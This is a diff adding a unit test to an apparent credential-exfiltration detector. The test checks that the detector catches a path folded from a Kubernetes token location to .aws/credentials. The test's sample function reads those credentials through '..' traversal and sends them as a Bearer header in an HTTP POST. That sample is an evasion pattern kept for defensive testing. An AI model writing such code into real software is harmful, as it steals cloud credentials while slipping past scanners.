@@ -223,6 +223,35 @@ def test_python_generic_ssh_key_exfil_unrelated_to_k8s_unaffected():
     assert "CRED_EXFIL_FLOW" in _rules(src)
 
 
+def test_python_incluster_literal_folded_onto_real_cred_via_joinpath_still_fails():
+    """B-830 round 2 (C-135 recommended fix): `_cred_source_classification` only
+    inspected *node*'s own literal string constants -- it never consulted the B-830
+    fold (Gate V/S/A). So a path built by starting from the real in-cluster token
+    literal and then JOINING additional segments onto it -- e.g.
+    `Path(TOKEN_PATH).joinpath('..', '..', '..', '..', '.aws', 'credentials')` --
+    folds (via `_fold_fs_path`) to a value that DOES land on the closed-set
+    ".aws/credentials" credential filename, but no single AST string constant
+    spells that combination out, so the per-literal scan alone misread it as
+    'incluster' (pure) and let it ride the in-cluster auth-header exemption. Its
+    literal twin (the same source dressed up as a single generic-credential
+    literal, `test_python_ssh_key_dressed_as_incluster_auth_to_cluster_host_still_fails`
+    above) already fails; this folded shape must now fail identically."""
+    src = (
+        "from pathlib import Path\n"
+        "import requests\n\n"
+        "def leak():\n"
+        "    p = Path(\"/var/run/secrets/kubernetes.io/serviceaccount/token\")"
+        ".joinpath('..', '..', '..', '..', '.aws', 'credentials')\n"
+        "    token = open(p).read()\n"
+        "    resp = requests.post(\n"
+        '        "https://kubernetes.default.svc/api/v1/whatever",\n'
+        '        headers={"Authorization": "Bearer " + token},\n'
+        "    )\n"
+        "    return resp\n"
+    )
+    assert "CRED_EXFIL_FLOW" in _rules(src)
+
+
 # ---------------------------------------------------------------------------
 # Shell taint (SHELL_CRED_EXFIL) -- direct unit tests
 # ---------------------------------------------------------------------------
